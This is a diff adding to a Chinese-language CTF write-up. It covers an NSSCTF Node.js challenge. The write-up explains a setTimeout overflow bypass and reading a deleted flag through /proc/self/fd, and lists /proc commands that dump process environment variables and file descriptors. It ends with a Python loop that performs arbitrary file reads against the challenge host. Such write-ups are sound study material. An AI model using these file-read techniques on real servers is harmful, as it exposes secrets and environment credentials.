@@ -1,3 +1,4 @@
+[TOC]
 # NSSCTF prize_p1 反序列化/throw/gc/
 
 
@@ -325,4 +326,165 @@ if __name__ == "__main__":
     data = {"0": 'phar://tmp/a.txt'}
     res = requests.post(url, data=data)
     open('f.html', 'wb').write(res.content)
+```
+
+# NSSCTF prize2 - nodejs 文件描述符
+题目
+```js
+const { randomBytes } = require('crypto');
+const express = require('express');
+const fs = require('fs');
+const fp = '/app/src/flag.txt';
+const app = express();
+const flag = Buffer(255);
+const a = fs.open(fp, 'r', (err, fd) => {
+    fs.read(fd, flag, 0, 44, 0, () => {
+        fs.rm(fp, () => {});
+    });
+});
+
+app.get('/', function (req, res) {
+    res.set('Content-Type', 'text/javascript;charset=utf-8');
+    res.send(fs.readFileSync(__filename));
+});
+
+app.get('/hint', function (req, res) {
+    res.send(flag.toString().slice(0, randomBytes(1)[0]%32));
+})
+
+// 随机数预测或者一天之后
+app.get('/getflag', function (req, res) {
+    res.set('Content-Type', 'text/javascript;charset=utf-8');
+    try {
+        let a = req.query.a;
+        if (a === randomBytes(3).toString()) {
+            res.send(fs.readFileSync(req.query.b));
+        } else {
+            const t = setTimeout(() => {
+                res.send(fs.readFileSync(req.query.b));
+            }, parseInt(req.query.c)?Math.max(86400, parseInt(req.query.c)):86400);
+        }
+    } catch {
+        res.send('?');
+    }
+})
+
+app.listen(80, '0.0.0.0', () => {
+    console.log('Start listening')
+});
+```
+* 考点1 - setTimeout
+
+https://nodejs.org/api/timers.html#timers_settimeout_callback_delay_args
+
+When delay is larger than `2147483647` or less than `1`, the delay will be set to 1. Non-integer delays are truncated to an integer.
+
+传过 2147483648 就能绕过
+
+nodejs/setTimeout
+
+* 考点2 文件描述符
+writeup https://www.wolai.com/atao/tr9YDnm9jdvsejyPCfnRLL
+wiki https://www.anquanke.com/post/id/241148#h2-8
+
+/proc/self  -- 查看进程
+/proc/11/fd
+
+本题利用的是/prod/pid/fd
+
+`cat /proc/42/cmdline`  --显示运行时命令
+```
+/proc/43/fd # ls
+0 1 10 2
+0 输入 1 输出  2 错误 10
+```
+
+__cmdline__
+
+cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：
+```sh
+cat /proc/2889/cmdline
+```
+
+__cwd__
+
+cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：
+
+```sh
+ls -al /proc/1090/cwd
+lrwxrwxrwx 1 postgres postgres 0 Mar 6 20:19 /proc/1090/cwd →/var/Lib/postgresql/9.5/main
+```
+
+__exe__
+
+exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：
+```sh
+ls -al /proc/1090/exe
+```
+
+__environ__
+
+environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：
+```
+cat /proc/2889/environ
+```
+
+__fd__
+
+fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。
+
+查看指定进程打开的某个文件的路径：
+```
+ls -al /proc/1070/fd
+```
+
+__这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。__
+
+
+__self__
+上面这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了 /proc 目录中的 self 子目录。
+
+`/proc/self` 表示当前进程目录。前面说了通过 `/proc/$pid/` 来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了 /proc/self/ 目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 /proc/本进程pid/ 。进程可以通过访问 /proc/self/ 目录来获取自己的系统信息，而不用每次都获取pid。
+
+有了self目录就方便多了，下面我们演示一下self的常见使用。
+
+获取当前启动进程的完整命令：
+```
+cat /proc/self/cmdline
+```
+
+当不知道目标网站的Web路径或当前路径时，这经常使用
+
+获得当前进程的可执行文件的完整路径：
+```
+ls -al /proc/self/exe
+cat /proc/self/environ
+cat /proc/self/fd/{id}
+
+```
+其他题目可能通过
+1./proc/$pid/environ
+2.内存 即Web+pwn
+
+## 非预期
+靶场环境是炸了出错后自动重启的。。。
+这里利用 fs.read 是异步操作来竞争，在它删除前进行读取。。。如果炸了环境会重启，又会生成新的flag.txt.所以不断访问这个文件即可有机会读取到。
+
+
+```python
+from time import sleep
+
+import requests
+
+url = 'http://731-247ece60-9330-4d0d.nss.ctfer.vip:9080/getflag?c=2147483648&b=/app/src/flag.txt'
+
+i = 0
+while True:
+    sleep(0.5)
+    print(i)
+    i += 1
+    res = requests.get(url)
+    if res.status_code == 200:
+        print(res.text)
+        exit(0)
 ```
